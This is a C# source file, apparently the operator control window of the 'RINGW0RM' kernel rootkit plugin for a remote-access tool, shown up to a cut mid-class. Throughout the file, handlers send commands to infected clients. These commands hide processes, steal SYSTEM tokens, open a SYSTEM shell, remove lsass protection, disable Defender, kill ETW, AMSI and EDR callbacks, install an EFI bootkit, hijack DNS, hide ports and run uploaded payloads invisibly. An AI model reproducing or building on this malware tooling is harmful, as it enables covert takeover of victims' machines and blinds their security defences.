using System;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using Pulsar.Plugin.Ring0.Common;
using MessagePack;

namespace Pulsar.Plugin.Ring0.Server
{
    public partial class RootkitWindow : Window
    {
        private readonly string _clientId;
        private readonly Action<string, string, byte[]> _sendCommand;
        private RootkitStatus _status;

        // Colors - MUST be Frozen to be usable across STA threads
        private static readonly SolidColorBrush SuccessGreen;
        private static readonly SolidColorBrush ErrorRed;
        private static readonly SolidColorBrush WarningYellow;
        private static readonly SolidColorBrush TextGray;
        
        static RootkitWindow()
        {
            // Create and freeze brushes in static constructor for thread safety
            SuccessGreen = new SolidColorBrush(Color.FromRgb(87, 166, 74));
            SuccessGreen.Freeze();
            ErrorRed = new SolidColorBrush(Color.FromRgb(207, 102, 121));
            ErrorRed.Freeze();
            WarningYellow = new SolidColorBrush(Color.FromRgb(220, 160, 50));
            WarningYellow.Freeze();
            TextGray = new SolidColorBrush(Color.FromRgb(220, 220, 220));
            TextGray.Freeze();
        }

        // Disposal tracking to prevent crashes on shutdown
        private volatile bool _isClosing = false;

        public RootkitWindow(string clientId, RootkitStatus status, Action<string, string, byte[]> sendCommand)
        {
            _clientId = clientId;
            _status = status ?? new RootkitStatus();
            _sendCommand = sendCommand;

            InitializeComponent();

            this.Title = $"RINGW0RM Control - {clientId}";
            this.Closing += (s, e) => _isClosing = true;
            UpdateStatusDisplay();
        }

        /// <summary>
        /// Safely invoke an action on the Dispatcher, handling shutdown gracefully.
        /// Prevents crashes when the window is closing or Dispatcher has shutdown.
        /// </summary>
        private void SafeInvoke(Action action)
        {
            if (_isClosing) return;
            try
            {
                if (Dispatcher.HasShutdownStarted || Dispatcher.HasShutdownFinished)
                    return;
                Dispatcher.Invoke(action);
            }
            catch (TaskCanceledException) { }
            catch (ObjectDisposedException) { }
            catch (InvalidOperationException) { }
        }

        private void UpdateStatusDisplay()
        {
            if (_status.DriverConnected)
            {
                lblConnStatus.Text = "● Connected to Rootkit";
                lblConnStatus.Foreground = SuccessGreen;
            }
            else if (_status.DriverLoaded)
            {
                lblConnStatus.Text = "○ Driver Loaded (not connected)";
                lblConnStatus.Foreground = WarningYellow;
            }
            else
            {
                lblConnStatus.Text = "○ Rootkit Not Connected";
                lblConnStatus.Foreground = ErrorRed;
            }

            lblDriverStatus.Text = _status.DriverLoaded ? "Driver: Loaded" : "Driver: Not Loaded";
            lblDriverStatus.Foreground = _status.DriverLoaded ? SuccessGreen : TextGray;

            lblDseStatus.Text = _status.DseEnabled ? "DSE: Enabled" : "DSE: Disabled";
            lblDseStatus.Foreground = _status.DseEnabled ? ErrorRed : SuccessGreen;

            lblSecureBootStatus.Text = _status.SecureBootEnabled ? "Secure Boot: ON" : "Secure Boot: OFF";
            lblSecureBootStatus.Foreground = _status.SecureBootEnabled ? WarningYellow : SuccessGreen;

            // Update build info labels
            if (_status.WindowsBuild > 0)
            {
                lblBuildStatus.Text = $"Build: {_status.WindowsBuild}";
                lblBuildStatus.Foreground = _status.BuildSupported ? SuccessGreen : ErrorRed;
                
                lblCompatStatus.Text = _status.BuildSupported ? "Offsets: Supported" : "Offsets: UNSUPPORTED";
                lblCompatStatus.Foreground = _status.BuildSupported ? SuccessGreen : ErrorRed;
            }

            SetControlsEnabled(_status.DriverConnected);
        }

        private void SetControlsEnabled(bool enabled)
        {
            btnHideProcess.IsEnabled = enabled;
            btnElevateProcess.IsEnabled = enabled;
            btnShellStart.IsEnabled = enabled;
            btnUnprotectAll.IsEnabled = enabled;
            btnSetProtection.IsEnabled = enabled;
            btnRestrictFile.IsEnabled = enabled;
            btnBypassIntegrity.IsEnabled = enabled;
            btnProtectAV.IsEnabled = enabled;
            btnSwapDriver.IsEnabled = enabled;
            btnDisableDefender.IsEnabled = enabled;
        }

        // ============ COMPATIBILITY CHECK ============
        private void BtnCompatCheck_Click(object sender, RoutedEventArgs e)
        {
            Log("[COMPATIBILITY CHECK] Checking system compatibility...");
            Log("  → Checking DSE status, Secure Boot, Windows build...");
            _sendCommand(_clientId, Ring0Commands.CMD_CHECK_STATUS, null);
        }

        // ============ PROCESS OPERATIONS ============
        private void BtnHideProcess_Click(object sender, RoutedEventArgs e)
        {
            if (!int.TryParse(txtPid.Text, out int pid) || pid <= 0)
            {
                Log("ERROR: Invalid PID - please enter a valid process ID");
                return;
            }
            Log($"[HIDE PROCESS] Sending request to hide PID {pid} from process enumeration...");
            Log($"  → Target: PID {pid}");
            Log($"  → Method: DKOM (Direct Kernel Object Manipulation)");
            Log($"  → Effect: Process will be invisible to Task Manager, Process Explorer, etc.");
            _sendCommand(_clientId, Ring0Commands.CMD_HIDE_PROCESS, BitConverter.GetBytes(pid));
        }

        private void BtnElevateProcess_Click(object sender, RoutedEventArgs e)
        {
            if (!int.TryParse(txtPid.Text, out int pid) || pid <= 0)
            {
                Log("ERROR: Invalid PID - please enter a valid process ID");
                return;
            }
            Log($"[ELEVATE PROCESS] Sending request to elevate PID {pid} to SYSTEM...");
            Log($"  → Target: PID {pid}");
            Log($"  → Method: Token stealing from System process (PID 4)");
            Log($"  → Effect: Process will have NT AUTHORITY\\SYSTEM privileges");
            _sendCommand(_clientId, Ring0Commands.CMD_ELEVATE_PROCESS, BitConverter.GetBytes(pid));
        }

        // ============ SYSTEM SHELL TAB ============
        private bool _shellStarted = false;

        private void BtnShellStart_Click(object sender, RoutedEventArgs e)
        {
            Log("[SYSTEM SHELL] Starting elevated shell session...");
            Log("  → Shell will run as NT AUTHORITY\\SYSTEM");
            Log("  → Protected with Antimalware Light + DKOM hiding");
            txtShellOutput.Text = ">> Starting SYSTEM shell...\n";
            _sendCommand(_clientId, Ring0Commands.CMD_SHELL_START, null);
            _shellStarted = true;
        }

        private void BtnShellSend_Click(object sender, RoutedEventArgs e)
        {
            SendShellCommand();
        }

        private void TxtShellCommand_KeyDown(object sender, System.Windows.Input.KeyEventArgs e)
        {
            if (e.Key == System.Windows.Input.Key.Enter)
            {
                SendShellCommand();
                e.Handled = true;
            }
        }

        private void SendShellCommand()
        {
            string command = txtShellCommand?.Text?.Trim() ?? "";
            if (string.IsNullOrEmpty(command)) return;

            if (!_shellStarted)
            {
                Log("[SHELL] Shell not started. Click 'Start Shell' first.");
                txtShellOutput.AppendText(">> Shell not started. Click 'Start Shell' first.\n");
                return;
            }

            // Show command in output
            txtShellOutput.AppendText($"C:\\> {command}\n");
            txtShellCommand.Text = "";

            // Send to client
            _sendCommand(_clientId, Ring0Commands.CMD_SHELL_EXECUTE, System.Text.Encoding.UTF8.GetBytes(command));
        }

        private void BtnUnprotectAll_Click(object sender, RoutedEventArgs e)
        {
            Log("[UNPROTECT ALL] Removing PP/PPL protection from all processes...");
            Log("  → Effect: All protected processes become terminable/injectable");
            Log("  → Target: csrss, lsass, antimalware, and all other protected processes");
            Log("  → Note: Client will validate Windows build before executing");
            _sendCommand(_clientId, Ring0Commands.CMD_UNPROTECT_ALL, null);
        }

        // ============ PROCESS PROTECTION ============
        private void BtnSetProtection_Click(object sender, RoutedEventArgs e)
        {
            if (!int.TryParse(txtProtPid.Text, out int pid) || pid <= 0)
            {
                Log("ERROR: Invalid PID - please enter a valid process ID");
                return;
            }

            var protType = (ProtectionType)cboProtType.SelectedIndex;
            var protSigner = (ProtectionSigner)cboProtSigner.SelectedIndex;
            
            var request = new ProcessRequest
            {
                Pid = pid,
                ProtType = protType,
                ProtSigner = protSigner
            };

            string typeStr = cboProtType.SelectedIndex >= 0 ? ((System.Windows.Controls.ComboBoxItem)cboProtType.SelectedItem)?.Content?.ToString() : "Unknown";
            string signerStr = cboProtSigner.SelectedIndex >= 0 ? ((System.Windows.Controls.ComboBoxItem)cboProtSigner.SelectedItem)?.Content?.ToString() : "Unknown";

            Log($"[SET PROTECTION] Applying kernel protection to PID {pid}...");
            Log($"  → Target: PID {pid}");
            Log($"  → Type: {typeStr} (PS_PROTECTION.Type = {(int)protType})");
            Log($"  → Signer: {signerStr} (PS_PROTECTION.Signer = {(int)protSigner})");
            if (protType == ProtectionType.None)
                Log($"  → Effect: Removing all protection from process");
            else
                Log($"  → Effect: Process will be protected from termination and memory access");

            _sendCommand(_clientId, Ring0Commands.CMD_SET_PROTECTION, MessagePackSerializer.Serialize(request));
        }

        // ============ FILE OPERATIONS ============
        private void BtnRestrictFile_Click(object sender, RoutedEventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtFilename.Text))
            {
                Log("ERROR: File path required - enter the full path to the file on the target system");
                return;
            }

            int.TryParse(txtAllowedPid.Text, out int allowedPid);
            var request = new FileRequest { AllowedPid = allowedPid, Filename = txtFilename.Text };
            
            Log($"[RESTRICT FILE] Setting kernel-level access restrictions...");
            Log($"  → Target file: {txtFilename.Text}");
            Log($"  → Allowed PID: {(allowedPid > 0 ? allowedPid.ToString() : "None (block all access)")}");
            Log($"  → Effect: Only PID {allowedPid} can access this file; all other access will be denied");
            
            _sendCommand(_clientId, Ring0Commands.CMD_RESTRICT_FILE, MessagePackSerializer.Serialize(request));
        }

        private void BtnBypassIntegrity_Click(object sender, RoutedEventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtFilename.Text))
            {
                Log("ERROR: File path required - enter the full path to the file on the target system");
                return;
            }
            
            Log($"[BYPASS INTEGRITY] Removing WFP integrity checks...");
            Log($"  → Target file: {txtFilename.Text}");
            Log($"  → Effect: Windows File Protection checks will be bypassed for this file");
            Log($"  → Warning: Allows modification of protected system files");
            
            _sendCommand(_clientId, Ring0Commands.CMD_BYPASS_INTEGRITY, Encoding.UTF8.GetBytes(txtFilename.Text));
        }

        private void BtnProtectAV_Click(object sender, RoutedEventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtFilename.Text))
            {
                Log("ERROR: File path required - enter the full path to the file on the target system");
                return;
            }
            
            Log($"[PROTECT FROM AV] Setting up AV/EDR evasion for file...");
            Log($"  → Target file: {txtFilename.Text}");
            Log($"  → Effect: Blocks antivirus/EDR from scanning or accessing this file");
            Log($"  → Method: Kernel-level file access filtering");
            
            _sendCommand(_clientId, Ring0Commands.CMD_PROTECT_FILE_AV, Encoding.UTF8.GetBytes(txtFilename.Text));
        }

        // ============ DRIVER OPERATIONS ============
        private void BtnConnect_Click(object sender, RoutedEventArgs e)
        {
            Log("[CONNECT] Attempting to connect to rootkit driver...");
            Log("  → Device path: RINGW0RM driver");
            _sendCommand(_clientId, Ring0Commands.CMD_CONNECT_ROOTKIT, null);
        }

        private void BtnInstall_Click(object sender, RoutedEventArgs e)
        {
            Log("[INSTALL ROOTKIT] Starting full installation...");
            Log("  → Step 1: Install driver as BOOT_START service");
            Log("  → Step 2: Enable test signing (for DSE bypass)");
            Log("  → Step 3: Install bootkit on EFI partition");
            Log("  → Note: Reboot required to activate bootkit and load driver");
            _sendCommand(_clientId, Ring0Commands.CMD_INSTALL_ROOTKIT, null);
        }

        private void BtnUninstall_Click(object sender, RoutedEventArgs e)
        {
            Log("[UNINSTALL] Removing rootkit and bootkit...");
            Log("  → Step 1: Stop and unload driver");
            Log("  → Step 2: Delete driver service");
            Log("  → Step 3: Restore original bootmgfw.efi");
            Log("  → Step 4: Clean up registry markers");
            _sendCommand(_clientId, Ring0Commands.CMD_UNINSTALL_ROOTKIT, null);
        }

        private void BtnSwapDriver_Click(object sender, RoutedEventArgs e)
        {
            Log("[SWAP DRIVER] Attempting MS driver certificate swap...");
            Log("  → Warning: This is an advanced DSE bypass technique");
            Log("  → Effect: Uses legitimate MS driver signature");
            _sendCommand(_clientId, Ring0Commands.CMD_SWAP_DRIVER, null);
        }

        private void BtnDisableDefender_Click(object sender, RoutedEventArgs e)
        {
            Log("[DISABLE DEFENDER] Permanently disabling Windows Defender...");
            Log("  → Step 1: Kill MsMpEng.exe and related processes using kernel privileges");
            Log("  → Step 2: Disable Defender services via registry");
            Log("  → Step 3: Block Defender executables from running");
            Log("  → Warning: This is a destructive operation");
            _sendCommand(_clientId, Ring0Commands.CMD_DISABLE_DEFENDER, null);
        }

        private void BtnRefresh_Click(object sender, RoutedEventArgs e)
        {
            Log("[REFRESH] Querying rootkit status...");
            _sendCommand(_clientId, Ring0Commands.CMD_CHECK_STATUS, null);
        }

        // ============ AV/EDR TAB HANDLERS ============
        private void BtnKillETW_Click(object sender, RoutedEventArgs e)
        {
            Log("[KILL ETW] Disabling Event Tracing for Windows...");
            Log("  → Target: ntoskrnl!EtwWrite");
            Log("  → Effect: Blinds all security telemetry and monitoring");
            Log("  → Note: This affects Windows Defender, EDR, and SIEM logging");
            try
            {
                Log($"  → Sending command: {Ring0Commands.CMD_KILL_ETW} to {_clientId}");
                _sendCommand(_clientId, Ring0Commands.CMD_KILL_ETW, null);
                Log("  → Command sent successfully (waiting for response)");
            }
            catch (Exception ex)
            {
                Log($"  → ERROR sending command: {ex.Message}");
            }
        }

        private void BtnKillAMSI_Click(object sender, RoutedEventArgs e)
        {
            Log("[KILL AMSI] Disabling Antimalware Scan Interface...");
            Log("  → Target: amsi.dll!AmsiScanBuffer");
            Log("  → Effect: PowerShell, .NET, VBScript, JScript bypass");
            _sendCommand(_clientId, Ring0Commands.CMD_KILL_AMSI, null);
        }

        private void BtnKillProcessCallbacks_Click(object sender, RoutedEventArgs e)
        {
            Log("[KILL CALLBACKS] Removing process creation callbacks...");
            Log("  → Target: PsSetCreateProcessNotifyRoutine callbacks");
            Log("  → Effect: EDR won't detect new process creation");
            _sendCommand(_clientId, Ring0Commands.CMD_KILL_PROCESS_CALLBACKS, null);
        }

        private void BtnKillThreadCallbacks_Click(object sender, RoutedEventArgs e)
        {
            Log("[KILL CALLBACKS] Removing thread creation callbacks...");
            Log("  → Target: PsSetCreateThreadNotifyRoutine callbacks");
            Log("  → Effect: EDR won't detect thread injection");
            _sendCommand(_clientId, Ring0Commands.CMD_KILL_THREAD_CALLBACKS, null);
        }

        private void BtnKillImageCallbacks_Click(object sender, RoutedEventArgs e)
        {
            Log("[KILL CALLBACKS] Removing image load callbacks...");
            Log("  → Target: PsSetLoadImageNotifyRoutine callbacks");
            Log("  → Effect: EDR won't detect DLL/driver loading");
            _sendCommand(_clientId, Ring0Commands.CMD_KILL_IMAGE_CALLBACKS, null);
        }

        private void BtnKillRegistryCallbacks_Click(object sender, RoutedEventArgs e)
        {
            Log("[KILL CALLBACKS] Removing registry callbacks...");
            Log("  → Target: CmRegisterCallback entries");
            Log("  → Effect: EDR won't monitor registry access");
            _sendCommand(_clientId, Ring0Commands.CMD_KILL_REGISTRY_CALLBACKS, null);
        }

        private void BtnKillAllCallbacks_Click(object sender, RoutedEventArgs e)
        {
            Log("[KILL ALL CALLBACKS] Removing ALL security callbacks...");
            Log("  → Removing process callbacks...");
            Log("  → Removing thread callbacks...");
            Log("  → Removing image load callbacks...");
            Log("  → Removing registry callbacks...");
            Log("  → WARNING: This will blind most EDR/AV products!");
            _sendCommand(_clientId, Ring0Commands.CMD_KILL_ALL_CALLBACKS, null);
        }

        private void BtnUnloadEDRDriver_Click(object sender, RoutedEventArgs e)
        {
            string driverName = txtEDRDriverName?.Text?.Trim() ?? "WdFilter";
            Log($"[UNLOAD DRIVER] Force unloading security driver: {driverName}");
            Log("  → Method: ZwUnloadDriver or direct memory manipulation");
            _sendCommand(_clientId, Ring0Commands.CMD_UNLOAD_DRIVER, System.Text.Encoding.UTF8.GetBytes(driverName));
        }

        private void BtnUnloadSpecificDriver_Click(object sender, RoutedEventArgs e)
        {
            BtnUnloadEDRDriver_Click(sender, e);
        }

        private void BtnUnhookSSDT_Click(object sender, RoutedEventArgs e)
        {
            Log("[UNHOOK SSDT] Restoring System Service Descriptor Table...");
            Log("  → Reading original entries from ntoskrnl.exe on disk");
            Log("  → Comparing with in-memory SSDT");
            Log("  → Restoring hooked entries");
            _sendCommand(_clientId, Ring0Commands.CMD_UNHOOK_SSDT, null);
        }

        private void BtnListSSDTHooks_Click(object sender, RoutedEventArgs e)
        {
            Log("[LIST SSDT HOOKS] Scanning for hooked SSDT entries...");
            _sendCommand(_clientId, Ring0Commands.CMD_LIST_SSDT_HOOKS, null);
        }

        // ============ NETWORKING TAB HANDLERS ============
        private void BtnHidePort_Click(object sender, RoutedEventArgs e)
        {
            if (!int.TryParse(txtHidePort?.Text, out int port))
            {
                Log("[ERROR] Invalid port number");
                return;
            }
            string protocol = (cboProtocol?.SelectedItem as System.Windows.Controls.ComboBoxItem)?.Content?.ToString() ?? "TCP";
            Log($"[HIDE PORT] Hiding {protocol} port {port} from netstat...");
            Log("  → Method: Hook NsiEnumerateObjectsAllParameters");
            _sendCommand(_clientId, Ring0Commands.CMD_HIDE_PORT, System.Text.Encoding.UTF8.GetBytes($"{port},{protocol.ToLower()}"));
        }

        private void BtnUnhidePort_Click(object sender, RoutedEventArgs e)
        {
            if (!int.TryParse(txtHidePort?.Text, out int port))
            {
                Log("[ERROR] Invalid port number");
                return;
            }
            string protocol = (cboProtocol?.SelectedItem as System.Windows.Controls.ComboBoxItem)?.Content?.ToString() ?? "TCP";
            Log($"[UNHIDE PORT] Making {protocol} port {port} visible again...");
            _sendCommand(_clientId, Ring0Commands.CMD_UNHIDE_PORT, System.Text.Encoding.UTF8.GetBytes($"{port},{protocol.ToLower()}"));
        }

        private void BtnListHiddenPorts_Click(object sender, RoutedEventArgs e)
        {
            Log("[LIST HIDDEN PORTS] Listing all hidden ports...");
            _sendCommand(_clientId, Ring0Commands.CMD_LIST_HIDDEN_PORTS, null);
        }

        private void BtnAddDNSRule_Click(object sender, RoutedEventArgs e)
        {
            string domain = txtDNSDomain?.Text?.Trim() ?? "";
            string redirect = txtDNSRedirect?.Text?.Trim() ?? "127.0.0.1";
            if (string.IsNullOrEmpty(domain))
            {
                Log("[ERROR] Domain name required");
                return;
            }
            Log($"[DNS] ==============================================");
            Log($"[DNS] Adding DNS hijack rule:");
            Log($"[DNS]   Domain: {domain}");
            Log($"[DNS]   Redirect to: {redirect}");
            Log($"[DNS] Method: WFP will auto-initialize if needed");
            Log($"[DNS] Rule stored in g_DnsRules array");
            Log($"[DNS] ==============================================");
            _sendCommand(_clientId, Ring0Commands.CMD_ADD_DNS_RULE, System.Text.Encoding.UTF8.GetBytes($"{domain},{redirect}"));
        }

        private void BtnRemoveDNSRule_Click(object sender, RoutedEventArgs e)
        {
            string domain = txtDNSDomain?.Text?.Trim() ?? "";
            if (string.IsNullOrEmpty(domain))
            {
                Log("[ERROR] Domain name required");
                return;
            }
            Log($"[DNS HIJACK] Removing rule for: {domain}");
            _sendCommand(_clientId, Ring0Commands.CMD_REMOVE_DNS_RULE, System.Text.Encoding.UTF8.GetBytes(domain));
        }

        private void BtnListDNSRules_Click(object sender, RoutedEventArgs e)
        {
            Log("[DNS HIJACK] Listing active DNS rules...");
            _sendCommand(_clientId, Ring0Commands.CMD_LIST_DNS_RULES, null);
        }

        private void BtnBlockIP_Click(object sender, RoutedEventArgs e)
        {
            string ip = txtFilterIP?.Text?.Trim() ?? "";
            string port = txtFilterPort?.Text?.Trim() ?? "";
            if (string.IsNullOrEmpty(ip))
            {
                Log("[ERROR] IP address required for blocking");
                return;
            }
            string target = port.Length > 0 ? $"{ip}:{port}" : ip;
            Log($"[BLOCK IP] ============================================");
            Log($"[BLOCK IP] Initiating packet filter for: {target}");
            Log($"[BLOCK IP] Method: WFP (Windows Filtering Platform) callout");
            Log($"[BLOCK IP] Action: All TCP/UDP packets to this IP will be DROPPED");
            Log($"[BLOCK IP] Driver: WfpClassifyCallback will inspect every packet");
            Log($"[BLOCK IP] ============================================");
            _sendCommand(_clientId, Ring0Commands.CMD_BLOCK_IP, System.Text.Encoding.UTF8.GetBytes($"{ip},{port}"));
        }

        private void BtnUnblockIP_Click(object sender, RoutedEventArgs e)
        {
            string ip = txtFilterIP?.Text?.Trim() ?? "";
            string port = txtFilterPort?.Text?.Trim() ?? "";
            if (string.IsNullOrEmpty(ip))
            {
                Log("[ERROR] IP address required for unblocking");
                return;
            }
            Log($"[PACKET FILTER] Unblocking: {ip}{(port.Length > 0 ? ":" + port : "")}");
            _sendCommand(_clientId, Ring0Commands.CMD_UNBLOCK_IP, System.Text.Encoding.UTF8.GetBytes($"{ip},{port}"));
        }

        private void BtnListBlocked_Click(object sender, RoutedEventArgs e)
        {
            Log("[PACKET FILTER] Listing blocked IPs/ports...");
            _sendCommand(_clientId, Ring0Commands.CMD_LIST_BLOCKED, null);
        }

        private void BtnStartStealthListener_Click(object sender, RoutedEventArgs e)
        {
            if (!int.TryParse(txtStealthPort?.Text, out int port))
            {
                Log("[ERROR] Invalid port number");
                return;
            }
            Log($"[STEALTH] =============================================");
            Log($"[STEALTH] Starting hidden listener on port {port}...");
            Log($"[STEALTH] Method: WSK (Winsock Kernel) socket");
            Log($"[STEALTH] Features:");
            Log($"[STEALTH]   - Port will be HIDDEN from netstat");
            Log($"[STEALTH]   - Port will NOT respond to port scanners");
            Log($"[STEALTH]   - WskRegister + WskCaptureProviderNPI called");
            Log($"[STEALTH]   - Added to g_HiddenPorts array");
            Log($"[STEALTH] =============================================");
            _sendCommand(_clientId, Ring0Commands.CMD_START_STEALTH_LISTENER, System.Text.Encoding.UTF8.GetBytes(port.ToString()));
        }

        private void BtnStopStealthListener_Click(object sender, RoutedEventArgs e)
        {
            Log("[STEALTH LISTENER] Stopping hidden listener...");
            _sendCommand(_clientId, Ring0Commands.CMD_STOP_STEALTH_LISTENER, null);
        }

        // ============ PUBLIC METHODS ============
        public void Log(string message)
        {
            SafeInvoke(() =>
            {
                txtLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {message}\n");
                txtLog.ScrollToEnd();
            });
        }

        /// <summary>
        /// Mark the client as disconnected and update UI accordingly
        /// </summary>
        public void MarkDisconnected()
        {
            SafeInvoke(() =>
            {
                _status.DriverConnected = false;
                _status.DriverLoaded = false;
                UpdateStatusDisplay();
                Log("[DISCONNECTED] Client has disconnected");
            });
        }

        public void LogMessage(string message) => Log(message);

        public void UpdateStatus(RootkitStatus status)
        {
            SafeInvoke(() =>
            {
                if (status != null)
                {
                    _status = status;
                    UpdateStatusDisplay();
                    Log(status.Message ?? "Status updated");
                }
            });
        }

        public void HandleResponse(string command, bool success, string message)
        {
            SafeInvoke(() =>
            {
                // Enhanced logging with command-specific feedback
                string statusIcon = success ? "✓" : "✗";
                string statusText = success ? "SUCCESS" : "FAILED";
                
                Log($"[RESPONSE] [{statusIcon}] {command}: {statusText}");
                
                if (!string.IsNullOrEmpty(message))
                {
                    Log($"  → Result: {message}");
                }
                
                // Provide command-specific detailed feedback
                if (success)
                {
                    switch (command)
                    {
                        case Ring0Commands.CMD_HIDE_PROCESS:
                            Log("  → Process is now hidden from Task Manager and Process Explorer");
                            break;
                        case Ring0Commands.CMD_ELEVATE_PROCESS:
                            Log("  → Process now has NT AUTHORITY\\SYSTEM privileges");
                            break;
                        case Ring0Commands.CMD_SET_PROTECTION:
                            Log("  → Process protection level has been modified in EPROCESS");
                            break;
                        case Ring0Commands.CMD_KILL_ETW:
                            Log("  → ETW telemetry is now disabled - security products are blinded");
                            lblETWStatus.Text = "ETW: KILLED";
                            lblETWStatus.Foreground = SuccessGreen;
                            break;
                        case Ring0Commands.CMD_KILL_AMSI:
                            Log("  → AMSI is now disabled - PowerShell/script scanning bypassed");
                            lblAMSIStatus.Text = "AMSI: KILLED";
                            lblAMSIStatus.Foreground = SuccessGreen;
                            break;
                        case Ring0Commands.CMD_KILL_PROCESS_CALLBACKS:
                            Log("  → Process creation callbacks removed - EDR blind to new processes");
                            break;
                        case Ring0Commands.CMD_KILL_THREAD_CALLBACKS:
                            Log("  → Thread callbacks removed - EDR blind to thread injection");
                            break;
                        case Ring0Commands.CMD_KILL_IMAGE_CALLBACKS:
                            Log("  → Image load callbacks removed - EDR blind to DLL loading");
                            break;
                        case Ring0Commands.CMD_KILL_REGISTRY_CALLBACKS:
                            Log("  → Registry callbacks removed - EDR blind to registry access");
                            break;
                        case Ring0Commands.CMD_KILL_ALL_CALLBACKS:
                            Log("  → ALL kernel callbacks removed - EDR/AV completely blinded");
                            break;
                        case Ring0Commands.CMD_HIDE_PORT:
                            Log("  → Port is now hidden from netstat and network monitoring");
                            break;
                        case Ring0Commands.CMD_ADD_DNS_RULE:
                            Log("  → DNS rule added - domain lookups will be redirected");
                            break;
                        case Ring0Commands.CMD_BLOCK_IP:
                            Log("  → Traffic to/from target is now being silently dropped");
                            break;
                        case Ring0Commands.CMD_INSTALL_ROOTKIT:
                            Log("  → Rootkit installed - reboot required to activate bootkit");
                            break;
                        case Ring0Commands.CMD_CONNECT_ROOTKIT:
                            Log("  → Connected to driver - all rootkit features available");
                            break;
                        case Ring0Commands.CMD_SHELL_START:
                            Log("  → SYSTEM shell started - ready to accept commands");
                            txtShellOutput.AppendText(">> Shell started as NT AUTHORITY\\SYSTEM\n>> Type commands below and press Enter\n\n");
                            break;
                        case Ring0Commands.CMD_SHELL_OUTPUT:
                        case Ring0Commands.CMD_SHELL_EXECUTE:
                            // Shell output is handled directly in message - append to shell output
                            if (!string.IsNullOrEmpty(message))
                            {
                                txtShellOutput.AppendText(message);
                                // Auto-scroll to bottom
                                txtShellOutput.ScrollToEnd();
                            }
                            break;
                    }
                }
                else
                {
                    Log($"  → ERROR: Command execution failed");
                    switch (command)
                    {
                        case Ring0Commands.CMD_HIDE_PROCESS:
                        case Ring0Commands.CMD_ELEVATE_PROCESS:
                        case Ring0Commands.CMD_SET_PROTECTION:
                            Log("  → Check: Is the PID valid? Is the driver connected?");
                            break;
                        case Ring0Commands.CMD_KILL_ETW:
                        case Ring0Commands.CMD_KILL_AMSI:
                            Log("  → Check: Is the driver connected? Does the OS version support this?");
                            break;
                        case Ring0Commands.CMD_INSTALL_ROOTKIT:
                            Log("  → Check: Is DSE bypassed? Are driver files present?");
                            break;
                    }
                }

                // Refresh status after driver state changes
                if (command == Ring0Commands.CMD_INSTALL_ROOTKIT ||
                    command == Ring0Commands.CMD_CONNECT_ROOTKIT ||
                    command == Ring0Commands.CMD_UNINSTALL_ROOTKIT ||
                    command == Ring0Commands.CMD_HIDE_PROCESS ||
                    command == Ring0Commands.CMD_ELEVATE_PROCESS ||
                    command == Ring0Commands.CMD_SET_PROTECTION ||
                    command == Ring0Commands.CMD_UNPROTECT_ALL)
                {
                // Refresh status after these operations
                    _sendCommand(_clientId, Ring0Commands.CMD_CHECK_STATUS, null);
                }
            });
        }

        #region Post-Exploitation Handlers

        private void BtnRunHidden_Click(object sender, RoutedEventArgs e)
        {
            string path = txtHiddenPath?.Text?.Trim() ?? "";
            string args = txtHiddenArgs?.Text?.Trim() ?? "";
            int payloadType = cboHiddenPayloadType?.SelectedIndex ?? 0;
            int parentChoice = cboHiddenParent?.SelectedIndex ?? 0;
            
            if (string.IsNullOrEmpty(path) && _pendingUploadPayload == null)
            {
                Log("[ERROR] Payload path required");
                return;
            }
            
            // Map parent choice to PID
            uint fakeParentPid = 0;
            string parentName = "None";
            if (parentChoice > 0)
            {
                parentName = (cboHiddenParent.SelectedItem as System.Windows.Controls.ComboBoxItem)?.Content?.ToString() ?? "None";
            }
            
            string payloadName = (cboHiddenPayloadType.SelectedItem as System.Windows.Controls.ComboBoxItem)?.Content?.ToString() ?? "exe";
            Log($"[RUN HIDDEN] Launching invisible {payloadName}...");
            
            // Check if we have a pending upload payload
            string actualPath;
            if (_pendingUploadPayload != null && _pendingUploadFilename != null)
            {
                // Step 1: Upload the file to client TEMP folder first
                string base64Data = Convert.ToBase64String(_pendingUploadPayload);
                string uploadParam = $"{_pendingUploadFilename}|{base64Data}";
                Log($"  → Uploading payload: {_pendingUploadFilename} ({_pendingUploadPayload.Length:N0} bytes)");
                _sendCommand(_clientId, Ring0Commands.CMD_UPLOAD_FILE, 
                    System.Text.Encoding.UTF8.GetBytes(uploadParam));
                
                // Step 2: Use the TEMP path for execution (client will expand %TEMP%)
                actualPath = $"%TEMP%\\{_pendingUploadFilename}";
                Log($"  → Execute path: {actualPath}");
                
                // Clear pending payload after use
                _pendingUploadPayload = null;
                _pendingUploadFilename = null;
            }
            else
            {
                actualPath = path;
                Log($"  → Path: {path}");
            }
            
            if (!string.IsNullOrEmpty(args)) Log($"  → Args: {args}");
            if (parentChoice > 0) Log($"  → Fake Parent: {parentName}");
            
            _sendCommand(_clientId, Ring0Commands.CMD_RUN_HIDDEN, 
                System.Text.Encoding.UTF8.GetBytes($"{payloadType},{fakeParentPid},{actualPath},{args}"));
        }

        // Store the payload file bytes for upload
        private byte[] _pendingUploadPayload = null;
        private string _pendingUploadFilename = null;

        private void BtnBrowsePayload_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                var dialog = new Microsoft.Win32.OpenFileDialog
                {
                    Title = "Select Payload to Upload to Client",
                    Filter = "All Files (*.*)|*.*|" +
                             "Executables (*.exe)|*.exe|" +
                             "Scripts (*.bat;*.ps1;*.vbs)|*.bat;*.ps1;*.vbs|" +
                             "DLLs (*.dll)|*.dll|" +
                             "Binary (*.bin)|*.bin",
                    CheckFileExists = true
                };

                if (dialog.ShowDialog() == true)
                {
                    string filename = System.IO.Path.GetFileName(dialog.FileName);
                    
                    // Read the file
                    _pendingUploadPayload = System.IO.File.ReadAllBytes(dialog.FileName);
                    _pendingUploadFilename = filename;
                    
                    // Update the textbox to show we'll upload this file
                    txtHiddenPath.Text = $"[UPLOAD] {filename} ({_pendingUploadPayload.Length:N0} bytes)";
                    
                    Log($"[BROWSE] Selected: {filename}");
                    Log($"[BROWSE] Size: {_pendingUploadPayload.Length:N0} bytes");
                    Log($"[BROWSE] File will be uploaded to client temp folder when 'Run Hidden' is clicked");
                }
            }
            catch (Exception ex)
            {
                Log($"[ERROR] Failed to browse for file: {ex.Message}");
            }
        }

